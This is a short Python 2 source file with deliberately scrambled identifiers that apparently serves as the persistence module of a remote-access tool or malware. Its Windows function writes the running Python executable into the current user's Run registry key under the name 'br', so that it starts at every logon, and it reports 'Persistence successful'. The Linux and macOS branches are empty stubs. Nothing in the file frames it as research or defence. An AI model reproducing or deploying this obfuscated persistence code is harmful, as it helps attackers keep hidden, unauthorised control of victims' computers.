# -*- coding: utf-8 -*-
import sys
def SOidCDdAkBnqeKNsrAaXuBJDCWqszXFV():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    tamombRaQQHEVKoGDVlmGhIzmXVQQuaU = r'Software\Microsoft\Windows\CurrentVersion\Run'
    ddVUCYCGOqywgAUQtrUrApZnPnVDJGhT = sys.executable
    try:
        hqeuKANZnmHbrztRJAMjbAeZLKylIpLd = _winreg.OpenKey(HKCU, tamombRaQQHEVKoGDVlmGhIzmXVQQuaU, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(hqeuKANZnmHbrztRJAMjbAeZLKylIpLd, 'br', 0, _winreg.REG_SZ, ddVUCYCGOqywgAUQtrUrApZnPnVDJGhT)
        _winreg.CloseKey(hqeuKANZnmHbrztRJAMjbAeZLKylIpLd)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def xEPmHtCrwicdXYthWPwLTotFiWLBDhxe():
    return False, 'nothing here yet'
def BvnGwoqQMFcjcOpWMvywmzToswNUvKuH():
    return False, 'nothing here yet'
def fRTWRMDwKMKaMMycbCQhFAtbEWeTzpNy(plat_type):
    if plat_type.startswith('win'):
        success, WrMqFkloXIpjfperaHGHwZjJFApdGgGy = SOidCDdAkBnqeKNsrAaXuBJDCWqszXFV()
    elif plat_type.startswith('linux'):
        success, WrMqFkloXIpjfperaHGHwZjJFApdGgGy = xEPmHtCrwicdXYthWPwLTotFiWLBDhxe()
    elif plat_type.startswith('darwin'):
        success, WrMqFkloXIpjfperaHGHwZjJFApdGgGy = BvnGwoqQMFcjcOpWMvywmzToswNUvKuH()
    else:
        return 'Error, platform unsupported.'
    if success:
        IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = 'Persistence successful, {}.'.format(WrMqFkloXIpjfperaHGHwZjJFApdGgGy)
    else:
        IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = 'Persistence unsuccessful, {}.'.format(WrMqFkloXIpjfperaHGHwZjJFApdGgGy)
    return IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD
